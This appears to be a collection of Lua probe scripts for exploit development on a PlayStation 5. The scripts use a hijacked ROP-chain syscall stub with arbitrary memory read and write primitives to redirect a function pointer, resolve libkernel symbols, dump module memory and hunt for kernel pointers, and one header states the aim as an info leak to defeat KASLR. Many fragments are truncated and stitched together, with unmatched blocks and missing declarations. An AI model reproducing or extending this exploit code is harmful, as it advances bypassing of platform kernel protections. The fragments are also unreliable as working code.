--------------------------------------------------------------------
print("")
print("=== B: CALL RESOLVED FUNCS ===")
do
    -- First get the ropchain addresses
    local pipe_str = tostring(syscall.pipe)
    local fn_addr_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")

    if fn_addr_str then
        print("fn_addr ptr: " .. fn_addr_str)

        -- Allocate GPU mmap to reach ropchain
        local sc_mmap = make_syscall(477)
        local sc_munmap = make_syscall(588)
        local gpu_size = 512 * 0x4000
        local gpu_addr
        pcall(function()
            gpu_addr = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
                uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
        end)

        if gpu_addr then
            local fn_ptr = uint64(fn_addr_str)
            local fn_orig = safe_rq(fn_ptr)
            if fn_orig then
                print("fn_addr original: " .. string.format("%08X_%08X", get_hi_lo(fn_orig)))

                -- Now resolve sceKernelGetCurrentCpu from libkernel
                local sc_dlsym = make_syscall(594)
                local sym_name = memory.alloc(64)
                local addr_out = memory.alloc(8)

                -- Try to get sceKernelGetCurrentCpu address
                local target_sym = "sceKernelGetCurrentCpu"
                for i = 1, #target_sym do memory.write_byte(sym_name+(i-1), string.byte(target_sym, i)) end
                memory.write_byte(sym_name + #target_sym, 0)
                safe_wq(addr_out, uint64(0))

                local ok_d, dret = pcall(function()
                    return sc_dlsym(uint64(0x2001), uint64(sym_name), uint64(addr_out))
                end)
                local drv = ok_d and to_num(dret) or -999

                if drv == 0 then
                    local target_addr = safe_rq(addr_out)
                    if target_addr then
                        local th, tl = get_hi_lo(target_addr)
                        print(string.format("  target func: %08X_%08X", th, tl))

                        -- Redirect fn_addr to call this function
                        -- The ropchain calls fn_addr with rdi as first arg
                        -- sceKernelGetCurrentCpu() takes no args, returns int
                        safe_wq(fn_ptr, target_addr)

                        -- Now call any syscall — the ropchain will call our target
                        -- But wait: the ropchain is designed for syscalls
                        -- We need to be careful: the ret value from the call
                        -- goes through the chain's restore logic

                        -- Actually, let's NOT redirect yet — just verify we can
                        -- Instead, let's see what the ORIGINAL fn_addr points to
                        -- by reading the instruction bytes there
                        print("  reading fn_addr target bytes:")
                        for off = 0, 0x30, 8 do
                            local q = safe_rq(fn_orig + off)
                            if q then
                                local qh, ql = get_hi_lo(q)
                                print(string.format("    +%02X: %08X_%08X", off, qh, ql))
                            end
                        end

                        -- Restore fn_addr
                        safe_wq(fn_ptr, fn_orig)
                    end
                end
            end
            pcall(function() sc_munmap(gpu_addr, uint64(gpu_size)) end)
        end
    end
end

--------------------------------------------------------------------
-- C) PS5 syscall scan — try ranges that might return kernel info
--------------------------------------------------------------------

print("=== C: SYSCALL SCAN ===")
do
    local out_buf = memory.alloc(0x100)
    local safe_syscalls = {

-- D) Try sceKernelDirectMemoryQuery (586) more carefully

print("")
print("=== D: DIRECT MEMORY QUERY ===")
do
    local sc_dmq = make_syscall(586)
    -- signature: sceKernelDirectMemoryQuery(off_t start, int flags,

    local info = memory.alloc(64)

            local t_v = safe_rd(info + 16)
            local sh, sl = 0, 0
            local eh, el = 0, 0
            if s_q then sh, sl = get_hi_lo(s_q) end
            if e_q then eh, el = get_hi_lo(e_q) end
            print(string.format("  query 0x%X: start=%08X_%08X end=%08X_%08X type=%d",
                start_off, sh, sl, eh, el, t_v or -1))

            -- Check for kernel addresses
            if sh >= 0xFFFF8000 then
                kptrs[#kptrs+1] = {src="dmq_start", off=start_off, h=sh, l=sl}
            end
            if eh >= 0xFFFF8000 then
                kptrs[#kptrs+1] = {src="dmq_end", off=start_off, h=eh, l=el}
            end
        else
            print(string.format("  query 0x%X: ret=%d", start_off, rv))
        end
    end
end
```

```lua
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_mmap = make_syscall(477)

            local fn_ptr = uint64(fn_addr_str)
            local fn_val = safe_rq(fn_ptr)

            if fn_val then
                local fh, fl = get_hi_lo(fn_val)
                print(string.format("fn_addr value: %08X_%08X", fh, fl))

                -- Try to read code at fn_val address
                print("")
                print("code at fn_addr target:")
                local fn_target = uint64(fn_val)

                for off = 0, 0x78, 8 do

                        else

    }

        memory.write_byte(sym_name + #sym, 0)
        safe_wq(addr_out, uint64(0))
        local ok, ret = pcall(function()
            return sc_dlsym(uint64(0), uint64(sym_name), uint64(addr_out))

            safe_wd(info, 0x160)

            local mname = ""
            if ok_n then
                for j = 0, 31 do
                    local b = safe_rd(info + 8 + j)
                    if b then b = b % 256
                        if b >= 0x20 and b < 0x7F then mname = mname .. string.char(b)
                        elseif b == 0 then break end

            local sym = "__error"
            for j = 1, #sym do memory.write_byte(sym_name+(j-1), string.byte(sym, j)) end
            memory.write_byte(sym_name + #sym, 0)
            safe_wq(addr_out, uint64(0))
            local ok_d, dret = pcall(function()

            end)

            if drv == 0 then

                if addr then

    for i = 0, 0x1F, 4 do safe_wd(info+i, 0) end
    safe_wd(info, 0x160)

    local sc_dgl = make_syscall(592)

            if ok then

                    if b then b = b % 256
                        if b >= 0x20 and b < 0x7F then name = name .. string.char(b)
                        elseif b == 0 then break end
                    end

                if name:find("libkernel") then

            end

        -- Read first 0x80 bytes of libkernel .text
```

```lua
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end

    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- Dump bytes at an address using dword reads (more reliable than qword)
local function dump_dwords(label, base_addr, count)
    print(label .. ":")
    local line = ""
    local any = false
    for i = 0, count - 1 do
        local d = safe_rd(base_addr + i * 4)
        if d then
            line = line .. string.format("%08X ", d)
            any = true
            if (i + 1) % 4 == 0 then
                print(string.format("  +%03X: %s", (i - 3) * 4, line))
                line = ""
            end
        else
            if not any then print("  NOT READABLE") end
            break
        end
    end
    if #line > 0 then print("  +" .. line) end
    return any
end

local sc_getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_dgl = make_syscall(592)
local sc_dgi = make_syscall(593)

print("fn_addr ptr: " .. (fn_addr_str or "nil"))

-- GPU mmap for heap access
local gpu_size = 512 * 0x4000
local gpu_addr
pcall(function()
    gpu_addr = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

local fn_val_h, fn_val_l = 0, 0
if fn_addr_str and gpu_addr then
    local fn_ptr = uint64(fn_addr_str)
    local fn_lo = safe_rd(fn_ptr)
    local fn_hi = safe_rd(fn_ptr + 4)
    fn_val_l = fn_lo or 0
    fn_val_h = fn_hi or 0
    print(string.format("fn_addr value: %08X_%08X", fn_val_h, fn_val_l))
end

--------------------------------------------------------------------
-- B) Read code at fn_addr target using dword reads
--------------------------------------------------------------------
print("")
print("=== B: CODE AT FN_ADDR TARGET ===")
if fn_val_h > 0 or fn_val_l > 0 then
    local target = uint64(string.format("0x%X%08X", fn_val_h, fn_val_l))
    local ok = dump_dwords("fn_addr target code", target, 32)

    -- Also scan for kernel-range dwords in the code
    if ok then
        print("  scanning for kernel refs:")
        for i = 0, 63 do
            local d = safe_rd(target + i * 4)
            if not d then break end
            -- Check pairs of dwords for kernel addresses
            if i % 2 == 0 then
                local d2 = safe_rd(target + i * 4 + 4)
                if d2 and d2 >= 0xFFFF8000 then
                    print(string.format("    +%03X: %08X_%08X KPTR!", i * 4, d2, d))
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- C) Get libkernel base and dump entry
--------------------------------------------------------------------
print("")
print("=== C: LIBKERNEL ===")
do
    local handles = memory.alloc(256)
    local num_buf = memory.alloc(8)
    pcall(function() sc_dgl(handles, 64, num_buf) end)
    local num = safe_rd(num_buf) or 0

    local info = memory.alloc(0x200)
    local libk_text_h, libk_text_l = 0, 0
    local libk_handle = 0

    for i = 0, math.min(num-1, 39) do
        local h = safe_rd(handles + i * 4)
        if h and h > 0 then
            for j = 0, 0x1F, 4 do safe_wd(info+j, 0) end
            safe_wd(info, 0x160)
            pcall(function() sc_dgi(uint64(h), info) end)
            local b = safe_rd(info + 8)
            if b then
                b = b % 256
                if b == string.byte("l") then  -- starts with 'l'
                    local name = ""
                    for j = 0, 19 do
                        local c = safe_rd(info + 8 + j)
                        if c then c = c % 256
                            if c >= 0x20 and c < 0x7F then name = name .. string.char(c)
                            elseif c == 0 then break end
                        end
                    end
                    if name:find("libkernel") then
                        libk_handle = h
                        libk_text_l = safe_rd(info + 0x108) or 0
                        libk_text_h = safe_rd(info + 0x10C) or 0
                        break
                    end
                end
            end
        end
    end

    if libk_text_h > 0 or libk_text_l > 0 then
        print(string.format("libkernel: h=%d text=%08X_%08X", libk_handle, libk_text_h, libk_text_l))

        -- Check if fn_addr is within libkernel
        if fn_val_h == libk_text_h then
            local off = fn_val_l - libk_text_l
            print(string.format("fn_addr = libkernel + 0x%X", off))
        else
            print("fn_addr NOT in libkernel text segment")
            print(string.format("  fn_addr: %08X_%08X", fn_val_h, fn_val_l))
            print(string.format("  libk:    %08X_%08X", libk_text_h, libk_text_l))
        end
    end
end

--------------------------------------------------------------------

do

    local num_buf = memory.alloc(8)
    pcall(function() sc_dgl(handles, 64, num_buf) end)
    local num = safe_rd(num_buf) or 0

    local addr_out = memory.alloc(8)

    memory.write_byte(sym_name + #sym, 0)

    -- Try handles 0, 1, 2, and actual module handles
    local try_handles = {0, 1, 2}
    for i = 0, math.min(num-1, 10) do
        local h = safe_rd(handles + i * 4)
        if h then try_handles[#try_handles+1] = h end
    end

    for _, h in ipairs(try_handles) do
        safe_wd(addr_out, 0)

        local ok, ret = pcall(function()
            return sc_dlsym(uint64(h), uint64(sym_name), uint64(addr_out))
        end)
        local rv = ok and to_num(ret) or -999
        if rv == 0 then
            local al = safe_rd(addr_out) or 0
            local ah = safe_rd(addr_out+4) or 0
            print(string.format("  h=%d: getpid = %08X_%08X", h, ah, al))
        else
            -- Only print a few

                print(string.format("  h=%d: ret=%d", h, rv))

        end

-- Cleanup
```

```lua
        }

        for _, q in ipairs(queries) do
            for i = 0, 0x3F, 4 do safe_wd(info+i, 0) end
            local ok, ret = pcall(function()
                local a = q.args()
                local sc = make_syscall(q.num)
                if #a == 4 then return sc(a[1], a[2], a[3], a[4])
                elseif #a == 6 then return sc(a[1], a[2], a[3], a[4], a[5], a[6])
                end
            end)
            local rv = ok and to_num(ret) or -999
            print(string.format("  %d %s: ret=%d", q.num, q.name, rv))

            if rv == 0 or (rv > 0 and rv < 100) then
                -- Scan info buffer for kernel addresses
                for off = 0, 0x78, 8 do
                    local q2 = safe_rq(info + off)
                    if q2 then
                        local h, l = get_hi_lo(q2)
                        if h >= 0xFFFF8000 then
                            print(string.format("    +%02X: %08X_%08X KPTR!", off, h, l))
                        elseif h ~= 0 and (h > 1 or l > 0x10000) then
                            print(string.format("    +%02X: %08X_%08X", off, h, l))
                        end
                    end
                end
            end
        end

        pcall(function() sc_munmap(test_page, uint64(0x4000)) end)
    end
end

print("")

do
    local sc_mincore = make_syscall(78)
    local page

            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)

        safe_wd(vec, 0)
        local ok, ret = pcall(function()
            return sc_mincore(uint64(page), uint64(0x4000), uint64(vec))
        end)
        local rv = ok and to_num(ret) or -999
        local v0 = safe_rd(vec)
        print(string.format("  mincore: ret=%d vec=%08X", rv, v0 or 0))
        pcall(function() sc_munmap(page, uint64(0x4000)) end)
    end
end

-- C) Full module dump — ALL 39 modules with complete info
--------------------------------------------------------------------
print("")
print("=== C: ALL MODULES ===")
do
    local handles = memory.alloc(256)
    local num_buf = memory.alloc(8)
    pcall(function() sc_dgl(handles, 64, num_buf) end)
    local num = safe_rd(num_buf) or 0

    local info = memory.alloc(0x200)
    local fn_addr_val_h, fn_addr_val_l = 0, 0

    -- Also get fn_addr for comparison
    local gpu_size = 512 * 0x4000
    local gpu
    pcall(function()
        gpu = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if gpu then
        local ps = tostring(syscall.pipe)
        local fas = ps:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
        if fas then
            local fp = uint64(fas)
            fn_addr_val_l = safe_rd(fp) or 0
            fn_addr_val_h = safe_rd(fp + 4) or 0
        end
    end

    print(string.format("fn_addr target: %08X_%08X", fn_addr_val_h, fn_addr_val_l))
    print(string.format("modules: %d", num))

    for i = 0, math.min(num-1, 39) do
        local h = safe_rd(handles + i * 4)
        if h and h > 0 then
            for j = 0, 0x1F, 4 do safe_wd(info+j, 0) end
            safe_wd(info, 0x160)
            local ok_i = pcall(function() sc_dgi(uint64(h), info) end)
            if ok_i then
                local name = ""
                for j = 0, 31 do
                    local b = safe_rd(info + 8 + j)
                    if b then b = b % 256
                        if b >= 0x20 and b < 0x7F then name = name .. string.char(b)
                        elseif b == 0 then break end
                    end
                end

                local txt_l = safe_rd(info + 0x108) or 0
                local txt_h = safe_rd(info + 0x10C) or 0
                local tsz_l = safe_rd(info + 0x110) or 0
                local tsz_h = safe_rd(info + 0x114) or 0

                -- Check if fn_addr falls in this module's range
                local in_mod = ""
                if fn_addr_val_h == txt_h and fn_addr_val_l >= txt_l then
                    local total_sz = tsz_l + 0x100000  -- generous estimate
                    if (fn_addr_val_l - txt_l) < total_sz then
                        in_mod = string.format(" ** fn_addr=text+0x%X **", fn_addr_val_l - txt_l)
                    end
                end

                -- Also check ALL info fields for kernel addrs
                local kptr_tag = ""
                for off = 0, 0x158, 8 do
                    local q = safe_rq(info + off)
                    if q then
                        local qh, ql = get_hi_lo(q)
                        if qh >= 0xFFFF8000 then
                            kptr_tag = kptr_tag .. string.format(" KPTR@+%02X!", off)
                        end
                    end
                end

                print(string.format("  [%d] h=%d %s t=%08X_%08X sz=%08X_%08X%s%s",
                    i, h, name, txt_h, txt_l, tsz_h, tsz_l, in_mod, kptr_tag))
            end
        end
    end

    if gpu then pcall(function() sc_munmap(gpu, uint64(gpu_size)) end) end
end
```

```lua
-- CRASH_CLASS: MODERATE (ptrace might crash, thread ops safe)
-- PROBE 42j: ptrace + thread ops + libkernel data segment scan
--
-- Last attempts at info leak for KASLR defeat:
--   A) ptrace(PT_GETREGS) on self — debug registers might have kernel addrs
--   B) thr_self, thr_get_name — thread syscalls
--   C) procctl (544) — process control info
--   D) libkernel data segment scan — GOT/PLT resolved pointers
--   E) Read fn_addr region to understand what memory range it's in

print("=== PROBE 42j: THREAD/PTRACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_dgi = make_syscall(593)
local sc_dgl = make_syscall(592)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

local kptrs = {}

-- A) ptrace (26) — try PT_GETREGS
--------------------------------------------------------------------
-- A) ptrace SKIPPED — crashes the loader (hard fault on syscall 26)

        return sc_ptrace(uint64(33), uint64(pid), uint64(regs), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999

                    kptrs[#kptrs+1] = {src="ptrace", off=off, h=h, l=l}
                elseif h ~= 0 or l ~= 0 then
                    print(string.format("    +%02X: %08X_%08X", off, h, l))

-- D) Libkernel data segment scan — look for kernel addresses
--------------------------------------------------------------------
print("")
print("=== D: LIBKERNEL DATA ===")
do
    local handles = memory.alloc(256)
    local num_buf = memory.alloc(8)
    pcall(function() sc_dgl(handles, 64, num_buf) end)
    local num = safe_rd(num_buf) or 0
    local info = memory.alloc(0x200)

    local libk_data_h, libk_data_l = 0, 0
    local libk_data_sz = 0

    for i = 0, math.min(num-1, 39) do
        local h = safe_rd(handles + i * 4)
        if h and h > 0 then
            for j = 0, 0x1F, 4 do safe_wd(info+j, 0) end
            safe_wd(info, 0x160)
            pcall(function() sc_dgi(uint64(h), info) end)
            local b = safe_rd(info + 8)
            if b and (b % 256) == string.byte("l") then
                local name = ""
                for j = 0, 15 do
                    local c = safe_rd(info + 8 + j)
                    if c then c = c % 256
                        if c >= 0x20 and c < 0x7F then name = name .. string.char(c)
                        elseif c == 0 then break end
                    end
                end
                if name:find("libkernel") then
                    libk_data_l = safe_rd(info + 0x118) or 0
                    libk_data_h = safe_rd(info + 0x11C) or 0
                    local sz_l = safe_rd(info + 0x120) or 0
                    libk_data_sz = sz_l % 0x100000  -- mask out flags
                    break
                end
            end
        end
    end

    if libk_data_h > 0 or libk_data_l > 0 then
        print(string.format("libkernel data: %08X_%08X sz=0x%X", libk_data_h, libk_data_l, libk_data_sz))

        local data_addr = uint64(string.format("0x%X%08X", libk_data_h, libk_data_l))

        -- Scan first 0x400 bytes of data segment for kernel pointers
        local found = 0
        for off = 0, math.min(libk_data_sz - 8, 0x3F8), 8 do
            local q = safe_rq(data_addr + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 then
                    print(string.format("  +%03X: %08X_%08X KPTR!", off, h, l))
                    kptrs[#kptrs+1] = {src="libk_data", off=off, h=h, l=l}
                    found = found + 1
                end
            else
                break
            end
        end
        if found == 0 then print("  no kernel pointers in first 1KB") end
    end
end

--------------------------------------------------------------------
-- E) Map fn_addr region — check what's around it
--------------------------------------------------------------------
print("")
print("=== E: FN_ADDR REGION ===")
do
    local gpu_size = 512 * 0x4000
    local gpu
    pcall(function()
        gpu = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)

    if gpu then
        local ps = tostring(syscall.pipe)
        local fas = ps:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
        if fas then
            local fp = uint64(fas)
            local fvl = safe_rd(fp) or 0
            local fvh = safe_rd(fp + 4) or 0

            -- Check what's at fn_addr region - scan backward and forward
            -- to find the boundaries of this mapping
            local fn_base = uint64(string.format("0x%X%08X", fvh, fvl))

            -- Read page-aligned start
            local page_l = fvl - (fvl % 0x4000)
            local page_base = uint64(string.format("0x%X%08X", fvh, page_l))
            print(string.format("fn_addr page: %08X_%08X", fvh, page_l))

            -- Read first and last qwords of the page
            local first = safe_rq(page_base)
            if first then
                local fh, fl = get_hi_lo(first)
                print(string.format("  page+000: %08X_%08X", fh, fl))
                -- Look for ELF magic or other signatures
                if fl == 0x464C457F then print("  *** ELF HEADER ***") end
            else
                print("  page start: not readable")
            end

            -- Check if there's a page BEFORE
            local prev_page = uint64(string.format("0x%X%08X", fvh, page_l - 0x4000))
            local pq = safe_rq(prev_page)
            print(string.format("  prev page (%08X_%08X): %s", fvh, page_l - 0x4000,
                pq and "readable" or "NOT readable"))
        end

        pcall(function() sc_munmap(gpu, uint64(gpu_size)) end)
    end
end

end
```
